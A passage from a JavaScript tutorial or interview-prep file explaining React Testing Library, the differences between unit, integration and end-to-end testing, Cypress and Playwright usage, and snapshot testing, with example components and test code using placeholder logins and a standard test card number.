  render(<Counter />);
  
  expect(screen.getByText('Count: 0')).toBeInTheDocument();
  
  await user.click(screen.getByRole('button', { name: /increment/i }));
  
  expect(screen.getByText('Count: 1')).toBeInTheDocument();
});

// Example 2: Search component
function SearchBox({ onSearch }) {
  const [query, setQuery] = useState('');
  
  const handleSubmit = (e) => {
    e.preventDefault();
    onSearch(query);
  };
  
  return (
    <form onSubmit={handleSubmit} role="search">
      <input
        type="text"
        placeholder="Search..."
        value={query}
        onChange={(e) => setQuery(e.target.value)}
      />
      <button type="submit">Search</button>
    </form>
  );
}

test('calls onSearch with query', async () => {
  const user = userEvent.setup();
  const handleSearch = jest.fn();
  render(<SearchBox onSearch={handleSearch} />);
  
  const input = screen.getByPlaceholderText('Search...');
  const button = screen.getByRole('button', { name: /search/i });
  
  await user.type(input, 'react testing');
  await user.click(button);
  
  expect(handleSearch).toHaveBeenCalledWith('react testing');
});

// Example 3: Todo list
function TodoList() {
  const [todos, setTodos] = useState([]);
  const [input, setInput] = useState('');
  
  const addTodo = () => {
    if (input.trim()) {
      setTodos([...todos, { id: Date.now(), text: input, done: false }]);
      setInput('');
    }
  };
  
  const toggleTodo = (id) => {
    setTodos(todos.map(todo =>
      todo.id === id ? { ...todo, done: !todo.done } : todo
    ));
  };
  
  return (
    <div>
      <input
        value={input}
        onChange={(e) => setInput(e.target.value)}
        placeholder="Add todo"
      />
      <button onClick={addTodo}>Add</button>
      
      <ul>
        {todos.map(todo => (
          <li key={todo.id}>
            <input
              type="checkbox"
              checked={todo.done}
              onChange={() => toggleTodo(todo.id)}
            />
            <span style={{ textDecoration: todo.done ? 'line-through' : 'none' }}>
              {todo.text}
            </span>
          </li>
        ))}
      </ul>
    </div>
  );
}

test('adds and toggles todos', async () => {
  const user = userEvent.setup();
  render(<TodoList />);
  
  const input = screen.getByPlaceholderText('Add todo');
  const addButton = screen.getByRole('button', { name: /add/i });
  
  // Add first todo
  await user.type(input, 'Buy milk');
  await user.click(addButton);
  
  expect(screen.getByText('Buy milk')).toBeInTheDocument();
  expect(input).toHaveValue('');
  
  // Add second todo
  await user.type(input, 'Walk dog');
  await user.click(addButton);
  
  expect(screen.getByText('Walk dog')).toBeInTheDocument();
  
  // Toggle first todo
  const checkboxes = screen.getAllByRole('checkbox');
  await user.click(checkboxes[0]);
  
  const firstTodo = screen.getByText('Buy milk');
  expect(firstTodo).toHaveStyle('text-decoration: line-through');
});

Testing with Providers:
------------------------

// Wrapper for tests needing context
function Wrapper({ children }) {
  return (
    <ThemeProvider>
      <AuthProvider>
        <Router>
          {children}
        </Router>
      </AuthProvider>
    </ThemeProvider>
  );
}

// Use wrapper in tests
test('component with providers', () => {
  render(<MyComponent />, { wrapper: Wrapper });
  
  // Test component
});

// Create custom render
function customRender(ui, options) {
  return render(ui, { wrapper: Wrapper, ...options });
}

// Use custom render
test('with custom render', () => {
  customRender(<MyComponent />);
});

RTL vs Enzyme:
--------------

// Enzyme (old way - implementation focused)
const wrapper = shallow(<Counter />);
expect(wrapper.state('count')).toBe(0); // Testing state
wrapper.find('button').simulate('click'); // Simulating events
expect(wrapper.state('count')).toBe(1);

// RTL (new way - user focused)
render(<Counter />);
expect(screen.getByText('Count: 0')).toBeInTheDocument(); // Testing what user sees
await userEvent.click(screen.getByRole('button')); // Real user interaction
expect(screen.getByText('Count: 1')).toBeInTheDocument();

// RTL advantages:
// ✅ Tests behavior, not implementation
// ✅ More maintainable (refactor-proof)
// ✅ Better accessibility testing
// ✅ Simulates real user interactions
// ✅ Recommended by React team

Debugging Tests:
----------------

// 1. screen.debug()
test('debugging', () => {
  render(<Component />);
  
  screen.debug(); // Prints entire DOM
  screen.debug(screen.getByRole('button')); // Prints specific element
});

// 2. logRoles
import { logRoles } from '@testing-library/react';

test('log roles', () => {
  const { container } = render(<Component />);
  logRoles(container); // Shows all accessible roles
});

// 3. Testing Playground
// Install: npm install --save-dev @testing-library/react-devtools
screen.logTestingPlaygroundURL();
// Opens browser with interactive query builder

Best Practices:
---------------

// 1. Query by role (accessibility)
// ✅ Good
screen.getByRole('button', { name: /submit/i });

// ❌ Bad
screen.getByTestId('submit-button');

// 2. Use userEvent over fireEvent
// ✅ Good
await userEvent.click(button);

// ❌ Bad
fireEvent.click(button);

// 3. Test user behavior, not implementation
// ✅ Good
expect(screen.getByText('Welcome, John')).toBeInTheDocument();

// ❌ Bad
expect(component.props.user.name).toBe('John');

// 4. Use findBy for async
// ✅ Good
const element = await screen.findByText('Loaded');

// ❌ Bad
await waitFor(() => {
  expect(screen.getByText('Loaded')).toBeInTheDocument();
});

// 5. Query for absence with queryBy
// ✅ Good
expect(screen.queryByText('Error')).not.toBeInTheDocument();

// ❌ Bad
expect(() => screen.getByText('Error')).toThrow();

Summary:

React Testing Library:
- Focus on user behavior
- Query by accessibility (roles, labels)
- Realistic user interactions (userEvent)
- Async testing support (findBy, waitFor)
- Works with Jest
- Encourages best practices
- Better than Enzyme
- Recommended by React team
- Refactor-proof tests
- Built-in accessibility testing
*/


/**
93. What is the difference between unit, integration, and E2E testing?
----------------------------------------------------------------------

Testing can be categorized by scope: unit tests check individual pieces,
integration tests verify how pieces work together, and E2E tests validate
the entire application from a user's perspective.

Testing Pyramid:
----------------

//                  /\
//                 /  \  E2E Tests (Few)
//                /____\
//               /      \
//              / Integ. \ Integration Tests (Some)
//             /__________\
//            /            \
//           /    Unit      \ Unit Tests (Many)
//          /________________\

// Bottom: Many fast, cheap unit tests
// Middle: Some integration tests
// Top: Few slow, expensive E2E tests

1. Unit Testing:
----------------

// Tests individual functions/components in isolation
// Fast, cheap, easy to debug

// Example 1: Pure function
// utils.js
export function calculateTotal(items) {
  return items.reduce((sum, item) => sum + item.price * item.quantity, 0);
}

// utils.test.js
import { calculateTotal } from './utils';

describe('calculateTotal', () => {
  test('calculates total for single item', () => {
    const items = [{ price: 10, quantity: 2 }];
    expect(calculateTotal(items)).toBe(20);
  });
  
  test('calculates total for multiple items', () => {
    const items = [
      { price: 10, quantity: 2 },
      { price: 5, quantity: 3 }
    ];
    expect(calculateTotal(items)).toBe(35);
  });
  
  test('returns 0 for empty array', () => {
    expect(calculateTotal([])).toBe(0);
  });
});

// Example 2: Component in isolation
// Button.jsx
export function Button({ onClick, children, disabled }) {
  return (
    <button onClick={onClick} disabled={disabled}>
      {children}
    </button>
  );
}

// Button.test.js
import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { Button } from './Button';

describe('Button component', () => {
  test('renders with text', () => {
    render(<Button>Click me</Button>);
    expect(screen.getByText('Click me')).toBeInTheDocument();
  });
  
  test('calls onClick when clicked', async () => {
    const user = userEvent.setup();
    const handleClick = jest.fn();
    render(<Button onClick={handleClick}>Click me</Button>);
    
    await user.click(screen.getByRole('button'));
    expect(handleClick).toHaveBeenCalledTimes(1);
  });
  
  test('is disabled when disabled prop is true', () => {
    render(<Button disabled>Click me</Button>);
    expect(screen.getByRole('button')).toBeDisabled();
  });
});

// Unit test characteristics:
// ✅ Fast (milliseconds)
// ✅ Isolated (mocked dependencies)
// ✅ Easy to debug
// ✅ High code coverage
// ❌ Don't catch integration issues
// ❌ Can give false confidence

2. Integration Testing:
-----------------------

// Tests how multiple units work together
// More realistic, catches integration bugs

// Example 1: Component with hooks and context
// TodoApp.jsx
function TodoApp() {
  const [todos, setTodos] = useState([]);
  const [input, setInput] = useState('');
  
  const addTodo = () => {
    if (input.trim()) {
      setTodos([...todos, { id: Date.now(), text: input, done: false }]);
      setInput('');
    }
  };
  
  const toggleTodo = (id) => {
    setTodos(todos.map(todo =>
      todo.id === id ? { ...todo, done: !todo.done } : todo
    ));
  };
  
  const deleteTodo = (id) => {
    setTodos(todos.filter(todo => todo.id !== id));
  };
  
  return (
    <div>
      <input
        value={input}
        onChange={(e) => setInput(e.target.value)}
        placeholder="Add todo"
      />
      <button onClick={addTodo}>Add</button>
      
      <ul>
        {todos.map(todo => (
          <li key={todo.id}>
            <input
              type="checkbox"
              checked={todo.done}
              onChange={() => toggleTodo(todo.id)}
            />
            <span>{todo.text}</span>
            <button onClick={() => deleteTodo(todo.id)}>Delete</button>
          </li>
        ))}
      </ul>
    </div>
  );
}

// TodoApp.test.js - Integration test
import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { TodoApp } from './TodoApp';

describe('TodoApp integration', () => {
  test('full todo workflow', async () => {
    const user = userEvent.setup();
    render(<TodoApp />);
    
    // Add first todo
    const input = screen.getByPlaceholderText('Add todo');
    await user.type(input, 'Buy milk');
    await user.click(screen.getByRole('button', { name: /add/i }));
    
    expect(screen.getByText('Buy milk')).toBeInTheDocument();
    
    // Add second todo
    await user.type(input, 'Walk dog');
    await user.click(screen.getByRole('button', { name: /add/i }));
    
    expect(screen.getByText('Walk dog')).toBeInTheDocument();
    
    // Toggle first todo
    const checkboxes = screen.getAllByRole('checkbox');
    await user.click(checkboxes[0]);
    
    expect(checkboxes[0]).toBeChecked();
    
    // Delete second todo
    const deleteButtons = screen.getAllByRole('button', { name: /delete/i });
    await user.click(deleteButtons[1]);
    
    expect(screen.queryByText('Walk dog')).not.toBeInTheDocument();
    expect(screen.getByText('Buy milk')).toBeInTheDocument();
  });
});

// Example 2: Component with API calls (mocked)
// UserProfile.jsx
function UserProfile({ userId }) {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);
  
  useEffect(() => {
    fetchUser(userId)
      .then(data => {
        setUser(data);
        setLoading(false);
      });
  }, [userId]);
  
  if (loading) return <div>Loading...</div>;
  if (!user) return <div>User not found</div>;
  
  return (
    <div>
      <h1>{user.name}</h1>
      <p>{user.email}</p>
      <p>{user.bio}</p>
    </div>
  );
}

// UserProfile.test.js - Integration test
import { render, screen, waitFor } from '@testing-library/react';
import { UserProfile } from './UserProfile';
import { fetchUser } from './api';

jest.mock('./api');

describe('UserProfile integration', () => {
  test('fetches and displays user data', async () => {
    const mockUser = {
      name: 'John Doe',
      email: 'john@example.com',
      bio: 'Software developer'
    };
    
    fetchUser.mockResolvedValue(mockUser);
    
    render(<UserProfile userId="123" />);
    
    // Initially shows loading
    expect(screen.getByText('Loading...')).toBeInTheDocument();
    
    // Wait for data to load
    await waitFor(() => {
      expect(screen.getByText('John Doe')).toBeInTheDocument();
    });
    
    // All user data displayed
    expect(screen.getByText('john@example.com')).toBeInTheDocument();
    expect(screen.getByText('Software developer')).toBeInTheDocument();
  });
  
  test('handles API errors', async () => {
    fetchUser.mockRejectedValue(new Error('API Error'));
    
    render(<UserProfile userId="123" />);
    
    await waitFor(() => {
      expect(screen.getByText('User not found')).toBeInTheDocument();
    });
  });
});

// Integration test characteristics:
// ✅ Tests real interactions
// ✅ Catches integration bugs
// ✅ More confidence than unit tests
// ❌ Slower than unit tests
// ❌ Harder to debug
// ❌ May need mocking

3. End-to-End (E2E) Testing:
-----------------------------

// Tests entire application flow from user perspective
// Most realistic, but slowest and most expensive

// Example with Cypress
// cypress/e2e/todo.cy.js
describe('Todo App E2E', () => {
  beforeEach(() => {
    cy.visit('http://localhost:3000');
  });
  
  it('completes full todo workflow', () => {
    // Add todo
    cy.get('input[placeholder="Add todo"]').type('Buy milk');
    cy.contains('button', 'Add').click();
    
    // Verify todo appears
    cy.contains('Buy milk').should('be.visible');
    
    // Add another todo
    cy.get('input[placeholder="Add todo"]').type('Walk dog');
    cy.contains('button', 'Add').click();
    
    // Check first todo
    cy.get('input[type="checkbox"]').first().check();
    
    // Verify it's checked
    cy.get('input[type="checkbox"]').first().should('be.checked');
    
    // Delete second todo
    cy.contains('Walk dog').parent().find('button').contains('Delete').click();
    
    // Verify it's gone
    cy.contains('Walk dog').should('not.exist');
    cy.contains('Buy milk').should('exist');
  });
  
  it('persists todos after page refresh', () => {
    // Add todo
    cy.get('input').type('Buy milk');
    cy.contains('Add').click();
    
    // Reload page
    cy.reload();
    
    // Todo still there
    cy.contains('Buy milk').should('exist');
  });
  
  it('handles empty input', () => {
    // Try to add empty todo
    cy.contains('button', 'Add').click();
    
    // No empty todo added
    cy.get('ul li').should('have.length', 0);
  });
});

// Example: E2E login flow
describe('Authentication E2E', () => {
  it('logs in user successfully', () => {
    cy.visit('/login');
    
    // Fill login form
    cy.get('input[name="email"]').type('user@example.com');
    cy.get('input[name="password"]').type('password123');
    cy.get('button[type="submit"]').click();
    
    // Should redirect to dashboard
    cy.url().should('include', '/dashboard');
    
    // Should show user name
    cy.contains('Welcome, John').should('be.visible');
    
    // Should have auth token
    cy.getCookie('auth-token').should('exist');
  });
  
  it('shows error for invalid credentials', () => {
    cy.visit('/login');
    
    cy.get('input[name="email"]').type('wrong@example.com');
    cy.get('input[name="password"]').type('wrongpass');
    cy.get('button[type="submit"]').click();
    
    // Should show error
    cy.contains('Invalid credentials').should('be.visible');
    
    // Should stay on login page
    cy.url().should('include', '/login');
  });
  
  it('logs out user', () => {
    // Login first
    cy.login('user@example.com', 'password123'); // Custom command
    
    // Click logout
    cy.contains('Logout').click();
    
    // Should redirect to login
    cy.url().should('include', '/login');
    
    // Auth token removed
    cy.getCookie('auth-token').should('not.exist');
  });
});

// E2E test characteristics:
// ✅ Tests real user flows
// ✅ Tests entire stack (frontend + backend + DB)
// ✅ Highest confidence
// ✅ Catches real-world bugs
// ❌ Very slow (seconds/minutes)
// ❌ Expensive to maintain
// ❌ Flaky (timing issues)
// ❌ Hard to debug

Comparison Table:
-----------------

// Aspect          | Unit           | Integration    | E2E
// ----------------|----------------|----------------|------------------
// Scope           | Single unit    | Multiple units | Entire app
// Speed           | Fast (ms)      | Medium (100ms) | Slow (seconds)
// Dependencies    | Mocked         | Some mocked    | Real
// Environment     | Isolated       | Partial        | Full stack
// Confidence      | Low            | Medium         | High
// Cost            | Cheap          | Medium         | Expensive
// Debugging       | Easy           | Medium         | Hard
// Maintenance     | Easy           | Medium         | Hard
// Flakiness       | Rare           | Occasional     | Common
// Coverage        | High           | Medium         | Low
// When to run     | Every save     | Every commit   | Before deploy

What to Test Where:
-------------------

// Unit Tests:
// ✅ Pure functions
// ✅ Utilities
// ✅ Component rendering
// ✅ Component props
// ✅ Event handlers
// ✅ Hooks logic
// ✅ State management

// Example:
test('calculateDiscount', () => {
  expect(calculateDiscount(100, 0.2)).toBe(80);
});

// Integration Tests:
// ✅ Component + hooks
// ✅ Component + context
// ✅ Component + API (mocked)
// ✅ Form workflows
// ✅ User interactions
// ✅ Multiple components together

// Example:
test('shopping cart', async () => {
  render(<ShoppingCart />);
  await addItem('Product 1');
  await updateQuantity(2);
  expect(getTotal()).toBe(40);
});

// E2E Tests:
// ✅ Critical user journeys
// ✅ Authentication flows
// ✅ Purchase flows
// ✅ Multi-page workflows
// ✅ Cross-browser testing
// ✅ Production-like scenarios

// Example:
test('complete purchase', () => {
  cy.visit('/products');
  cy.addToCart('Product 1');
  cy.checkout();
  cy.fillPaymentInfo();
  cy.confirmPurchase();
  cy.verifyOrderConfirmation();
});

Testing Strategy:
-----------------

// 1. Start with unit tests (70%)
// - Test all functions and components
// - Fast feedback during development
// - Easy to maintain

// 2. Add integration tests (20%)
// - Test critical workflows
// - Verify components work together
// - Balance speed and confidence

// 3. Add E2E tests (10%)
// - Test critical user paths
// - Happy path + edge cases
// - Before deployments only

// Example: E-commerce app

// Unit Tests (70%):
// - Product card rendering
// - Cart calculations
// - Form validations
// - Utility functions
// - Hooks

// Integration Tests (20%):
// - Add to cart workflow
// - Search and filter
// - Product listing + pagination
// - Checkout form

// E2E Tests (10%):
// - Complete purchase flow
// - User registration + login
// - Password reset
// - Product search to purchase

Real-World Example:
-------------------

// Feature: User Registration

// Unit Test - Form validation
test('validateEmail', () => {
  expect(validateEmail('test@example.com')).toBe(true);
  expect(validateEmail('invalid')).toBe(false);
});

// Integration Test - Form submission
test('registration form', async () => {
  const handleSubmit = jest.fn();
  render(<RegistrationForm onSubmit={handleSubmit} />);
  
  await userEvent.type(screen.getByLabelText('Email'), 'test@example.com');
  await userEvent.type(screen.getByLabelText('Password'), 'password123');
  await userEvent.click(screen.getByRole('button', { name: /register/i }));
  
  expect(handleSubmit).toHaveBeenCalledWith({
    email: 'test@example.com',
    password: 'password123'
  });
});

// E2E Test - Full registration flow
test('user registration flow', () => {
  cy.visit('/register');
  cy.get('input[name="email"]').type('newuser@example.com');
  cy.get('input[name="password"]').type('SecurePass123');
  cy.get('input[name="confirmPassword"]').type('SecurePass123');
  cy.get('button[type="submit"]').click();
  
  // Verify account created
  cy.url().should('include', '/welcome');
  cy.contains('Welcome aboard!').should('be.visible');
  
  // Verify can log in
  cy.visit('/logout');
  cy.visit('/login');
  cy.get('input[name="email"]').type('newuser@example.com');
  cy.get('input[name="password"]').type('SecurePass123');
  cy.get('button[type="submit"]').click();
  cy.url().should('include', '/dashboard');
});

Summary:

Unit Tests:
- Test individual functions/components
- Fast, isolated, easy to debug
- Many tests (70% of suite)
- Mocked dependencies
- Run on every save

Integration Tests:
- Test multiple components together
- Medium speed, some mocking
- Moderate tests (20% of suite)
- Balance speed and confidence
- Run on every commit

E2E Tests:
- Test entire application flow
- Slow, expensive, high confidence
- Few tests (10% of suite)
- Real environment
- Run before deployment
*/


/**
94. What tools are used for E2E testing (Cypress, Playwright)?
--------------------------------------------------------------

Cypress and Playwright are the most popular modern E2E testing frameworks.
Both allow you to test your application in real browsers with real user interactions.

Cypress:
--------

// Installation
npm install --save-dev cypress

// Open Cypress
npx cypress open

// Project structure:
cypress/
  e2e/
    login.cy.js
    dashboard.cy.js
  fixtures/
    users.json
  support/
    commands.js
    e2e.js

// Basic Cypress test
// cypress/e2e/login.cy.js
describe('Login Page', () => {
  beforeEach(() => {
    // Visit page before each test
    cy.visit('http://localhost:3000/login');
  });
  
  it('should log in successfully', () => {
    // Type into inputs
    cy.get('input[name="email"]').type('user@example.com');
    cy.get('input[name="password"]').type('password123');
    
    // Click button
    cy.get('button[type="submit"]').click();
    
    // Assertions
    cy.url().should('include', '/dashboard');
    cy.contains('Welcome back!').should('be.visible');
  });
  
  it('shows error for invalid credentials', () => {
    cy.get('input[name="email"]').type('wrong@example.com');
    cy.get('input[name="password"]').type('wrongpass');
    cy.get('button[type="submit"]').click();
    
    cy.contains('Invalid credentials').should('be.visible');
    cy.url().should('include', '/login');
  });
});

// Cypress Commands:
cy.visit('/path');                  // Navigate to URL
cy.get('selector');                 // Get element
cy.contains('text');                // Find by text
cy.click();                         // Click element
cy.type('text');                    // Type into input
cy.check();                         // Check checkbox/radio
cy.select('option');                // Select from dropdown
cy.clear();                         // Clear input
cy.submit();                        // Submit form
cy.reload();                        // Reload page
cy.go('back');                      // Go back
cy.wait(1000);                      // Wait milliseconds
cy.wait('@alias');                  // Wait for request

// Assertions:
cy.should('be.visible');
cy.should('have.text', 'text');
cy.should('have.value', 'value');
cy.should('have.class', 'active');
cy.should('be.disabled');
cy.should('be.checked');
cy.should('have.length', 3);
cy.should('contain', 'text');
cy.should('exist');
cy.should('not.exist');

Cypress Advanced Features:
---------------------------

// 1. Custom commands
// cypress/support/commands.js
Cypress.Commands.add('login', (email, password) => {
  cy.visit('/login');
  cy.get('input[name="email"]').type(email);
  cy.get('input[name="password"]').type(password);
  cy.get('button[type="submit"]').click();
  cy.url().should('include', '/dashboard');
});

// Use custom command
it('tests dashboard', () => {
  cy.login('user@example.com', 'password123');
  // Now on dashboard, continue testing
});

// 2. Fixtures (test data)
// cypress/fixtures/users.json
{
  "validUser": {
    "email": "user@example.com",
    "password": "password123"
  },
  "invalidUser": {
    "email": "invalid@example.com",
    "password": "wrongpass"
  }
}

// Use fixture
it('logs in with fixture data', () => {
  cy.fixture('users').then(users => {
    cy.get('input[name="email"]').type(users.validUser.email);
    cy.get('input[name="password"]').type(users.validUser.password);
    cy.get('button[type="submit"]').click();
  });
});

// 3. Intercepting API requests
it('intercepts API call', () => {
  // Stub API response
  cy.intercept('GET', '/api/users', {
    statusCode: 200,
    body: [
      { id: 1, name: 'John' },
      { id: 2, name: 'Jane' }
    ]
  }).as('getUsers');
  
  cy.visit('/users');
  
  // Wait for request
  cy.wait('@getUsers');
  
  // Verify UI shows data
  cy.contains('John').should('be.visible');
  cy.contains('Jane').should('be.visible');
});

// 4. Network stubbing
it('tests offline behavior', () => {
  cy.intercept('GET', '/api/data', { forceNetworkError: true });
  
  cy.visit('/dashboard');
  cy.contains('Network error').should('be.visible');
});

// 5. File upload
it('uploads file', () => {
  cy.get('input[type="file"]').selectFile('cypress/fixtures/image.png');
  cy.get('button').contains('Upload').click();
  cy.contains('Upload successful').should('be.visible');
});

// 6. Screenshots and videos
it('takes screenshot', () => {
  cy.visit('/page');
  cy.screenshot('page-screenshot');
});

// Videos recorded automatically on failure

Playwright:
-----------

// Installation
npm install --save-dev @playwright/test

// Project structure:
tests/
  login.spec.js
  dashboard.spec.js
playwright.config.js

// Basic Playwright test
// tests/login.spec.js
import { test, expect } from '@playwright/test';

test.describe('Login Page', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('http://localhost:3000/login');
  });
  
  test('should log in successfully', async ({ page }) => {
    // Fill inputs
    await page.fill('input[name="email"]', 'user@example.com');
    await page.fill('input[name="password"]', 'password123');
    
    // Click button
    await page.click('button[type="submit"]');
    
    // Assertions
    await expect(page).toHaveURL(/.*dashboard/);
    await expect(page.locator('text=Welcome back!')).toBeVisible();
  });
  
  test('shows error for invalid credentials', async ({ page }) => {
    await page.fill('input[name="email"]', 'wrong@example.com');
    await page.fill('input[name="password"]', 'wrongpass');
    await page.click('button[type="submit"]');
    
    await expect(page.locator('text=Invalid credentials')).toBeVisible();
    await expect(page).toHaveURL(/.*login/);
  });
});

// Playwright API:
page.goto('url');                   // Navigate
page.click('selector');             // Click
page.fill('selector', 'text');      // Fill input
page.check('selector');             // Check checkbox
page.selectOption('selector', 'value'); // Select option
page.press('selector', 'Enter');    // Press key
page.screenshot();                  // Take screenshot
page.reload();                      // Reload page
page.goBack();                      // Go back
page.waitForSelector('selector');   // Wait for element
page.waitForLoadState('networkidle'); // Wait for network

// Locators:
page.locator('selector');
page.locator('text=Submit');
page.locator('button:has-text("Submit")');
page.getByRole('button', { name: 'Submit' });
page.getByLabel('Email');
page.getByPlaceholder('Enter email');
page.getByTestId('submit-button');

Playwright Advanced Features:
------------------------------

// 1. Multiple browsers
import { chromium, firefox, webkit } from '@playwright/test';

test('cross-browser test', async () => {
  // Chromium
  const chromiumBrowser = await chromium.launch();
  const chromiumPage = await chromiumBrowser.newPage();
  await chromiumPage.goto('http://localhost:3000');
  await chromiumBrowser.close();
  
  // Firefox
  const firefoxBrowser = await firefox.launch();
  const firefoxPage = await firefoxBrowser.newPage();
  await firefoxPage.goto('http://localhost:3000');
  await firefoxBrowser.close();
  
  // WebKit (Safari)
  const webkitBrowser = await webkit.launch();
  const webkitPage = await webkitBrowser.newPage();
  await webkitPage.goto('http://localhost:3000');
  await webkitBrowser.close();
});

// 2. Mobile emulation
test('mobile view', async ({ browser }) => {
  const context = await browser.newContext({
    ...devices['iPhone 12']
  });
  const page = await context.newPage();
  await page.goto('http://localhost:3000');
  // Test mobile view
});

// 3. API mocking
test('mock API', async ({ page }) => {
  await page.route('** /api/users', route => {
    route.fulfill({
      status: 200,
      body: JSON.stringify([
        { id: 1, name: 'John' },
        { id: 2, name: 'Jane' }
      ])
    });
  });
  
  await page.goto('/users');
  await expect(page.locator('text=John')).toBeVisible();
});

// 4. Authentication state
// Save auth state
test('save auth', async ({ page }) => {
  await page.goto('/login');
  await page.fill('input[name="email"]', 'user@example.com');
  await page.fill('input[name="password"]', 'password123');
  await page.click('button[type="submit"]');
  
  // Save cookies/storage
  await page.context().storageState({ path: 'auth.json' });
});

// Reuse auth state
test.use({ storageState: 'auth.json' });

test('already logged in', async ({ page }) => {
  await page.goto('/dashboard');
  // Already authenticated!
});

// 5. Parallel execution
// playwright.config.js
export default {
  workers: 4, // Run 4 tests in parallel
  use: {
    headless: true,
    screenshot: 'only-on-failure',
    video: 'retain-on-failure',
  }
};

// 6. Visual regression testing
test('visual comparison', async ({ page }) => {
  await page.goto('/');
  await expect(page).toHaveScreenshot('homepage.png');
});

// First run creates baseline
// Subsequent runs compare with baseline

Cypress vs Playwright:
-----------------------

// Feature               | Cypress           | Playwright
// ----------------------|-------------------|------------------
// Browser Support       | Chrome, Firefox   | Chrome, Firefox, Safari
// Speed                 | Medium            | Fast
// API Style             | Chained           | Async/await
// Auto-waiting          | Yes               | Yes
// Network Control       | Yes               | Yes
// Multiple tabs         | Limited           | Full support
// Mobile Testing        | Limited           | Native
// Parallel Tests        | Paid feature      | Built-in
// Visual Testing        | Plugin            | Built-in
// Learning Curve        | Easy              | Medium
// Community             | Large             | Growing
// Debugging             | Excellent         | Good
// CI/CD                 | Easy              | Easy

// Cypress Syntax (chained):
cy.get('input').type('text').should('have.value', 'text');

// Playwright Syntax (async/await):
await page.fill('input', 'text');
await expect(page.locator('input')).toHaveValue('text');

Real-World E2E Test Examples:
------------------------------

// Example 1: E-commerce purchase flow

// Cypress
describe('Purchase Flow', () => {
  it('completes purchase', () => {
    // Login
    cy.login('user@example.com', 'password');
    
    // Browse products
    cy.visit('/products');
    cy.contains('Laptop').click();
    
    // Add to cart
    cy.get('button').contains('Add to Cart').click();
    cy.contains('Item added').should('be.visible');
    
    // Go to cart
    cy.get('[data-testid="cart-icon"]').click();
    cy.url().should('include', '/cart');
    
    // Proceed to checkout
    cy.contains('Checkout').click();
    
    // Fill shipping info
    cy.get('input[name="address"]').type('123 Main St');
    cy.get('input[name="city"]').type('New York');
    cy.get('input[name="zip"]').type('10001');
    
    // Fill payment info
    cy.get('input[name="cardNumber"]').type('4111111111111111');
    cy.get('input[name="expiry"]').type('12/25');
    cy.get('input[name="cvv"]').type('123');
    
    // Complete purchase
    cy.get('button[type="submit"]').contains('Place Order').click();
    
    // Verify success
    cy.contains('Order confirmed').should('be.visible');
    cy.get('[data-testid="order-number"]').should('exist');
  });
});

// Playwright
test('Purchase Flow', async ({ page }) => {
  // Login
  await page.goto('/login');
  await page.fill('input[name="email"]', 'user@example.com');
  await page.fill('input[name="password"]', 'password123');
  await page.click('button[type="submit"]');
  
  // Browse products
  await page.goto('/products');
  await page.click('text=Laptop');
  
  // Add to cart
  await page.click('button:has-text("Add to Cart")');
  await expect(page.locator('text=Item added')).toBeVisible();
  
  // Go to cart
  await page.click('[data-testid="cart-icon"]');
  await expect(page).toHaveURL(/.*cart/);
  
  // Proceed to checkout
  await page.click('text=Checkout');
  
  // Fill shipping info
  await page.fill('input[name="address"]', '123 Main St');
  await page.fill('input[name="city"]', 'New York');
  await page.fill('input[name="zip"]', '10001');
  
  // Fill payment info
  await page.fill('input[name="cardNumber"]', '4111111111111111');
  await page.fill('input[name="expiry"]', '12/25');
  await page.fill('input[name="cvv"]', '123');
  
  // Complete purchase
  await page.click('button[type="submit"]:has-text("Place Order")');
  
  // Verify success
  await expect(page.locator('text=Order confirmed')).toBeVisible();
  await expect(page.locator('[data-testid="order-number"]')).toBeVisible();
});

Best Practices:
---------------

// 1. Use data-testid for stable selectors
// ✅ Good
<button data-testid="submit-btn">Submit</button>
cy.get('[data-testid="submit-btn"]').click();

// ❌ Bad (brittle)
cy.get('.btn-primary.large').click();

// 2. Don't use cy.wait with times
// ❌ Bad
cy.wait(5000);

// ✅ Good
cy.get('.loading').should('not.exist');

// 3. Use beforeEach for common setup
beforeEach(() => {
  cy.login('user@example.com', 'password');
});

// 4. Group related tests
describe('Shopping Cart', () => {
  describe('Adding items', () => {
    it('adds single item', () => {});
    it('adds multiple items', () => {});
  });
  
  describe('Removing items', () => {
    it('removes single item', () => {});
    it('empties cart', () => {});
  });
});

// 5. Keep tests independent
// Each test should be able to run alone

Summary:

Cypress:
- Easy to learn and use
- Great debugging experience
- Chained API style
- Chrome/Firefox support
- Strong community
- Best for: Getting started quickly

Playwright:
- Multiple browsers (including Safari)
- Fast execution
- Async/await style
- Built-in parallelization
- Mobile testing
- Visual regression testing
- Best for: Cross-browser testing, advanced features
*/


/**
95. What is snapshot testing?
-----------------------------

Snapshot testing captures the rendered output of a component and saves it as a
reference file. Future test runs compare against this snapshot to detect
unexpected changes.

Basic Snapshot Test:
--------------------

// Button.jsx
export function Button({ children, variant = 'primary' }) {
  return (
    <button className={`btn btn-${variant}`}>
      {children}
    </button>
  );
}

// Button.test.js
import { render } from '@testing-library/react';
import { Button } from './Button';

test('matches snapshot', () => {
  const { container } = render(<Button>Click me</Button>);
  
  // Creates snapshot file on first run
  expect(container).toMatchSnapshot();
});

// First run creates:
// __snapshots__/Button.test.js.snap
exports[`matches snapshot 1`] = `
<div>
  <button
    class="btn btn-primary"
  >
    Click me
  </button>
</div>
`;

// Subsequent runs compare against this

How Snapshot Testing Works:
----------------------------

// 1. First run: Create snapshot
test('component snapshot', () => {
  const { container } = render(<MyComponent />);
  expect(container).toMatchSnapshot();
});

// Creates snapshot file with component's HTML

// 2. Subsequent runs: Compare
// - If output matches snapshot ✅ Test passes
// - If output differs ❌ Test fails

// 3. When test fails:
// - Review diff
// - If change is intentional: Update snapshot
// - If change is bug: Fix code

Updating Snapshots:
-------------------

// When you intentionally change component:
// Test fails showing diff

// Update snapshot with:
npm test -- -u
// or
npm test -- --updateSnapshot

// Updates all failing snapshots

// Update specific test:
npm test Button.test.js -u

Snapshot Testing Use Cases:
----------------------------

// 1. Component Rendering
test('renders user card', () => {
  const user = {
    name: 'John Doe',
    email: 'john@example.com',
    avatar: 'avatar.jpg'
  };
  
  const { container } = render(<UserCard user={user} />);
  expect(container).toMatchSnapshot();
});

// 2. Different Props/States
describe('Button snapshots', () => {
  test('primary variant', () => {
    const { container } = render(<Button variant="primary">Primary</Button>);
    expect(container).toMatchSnapshot();
  });
  
  test('secondary variant', () => {
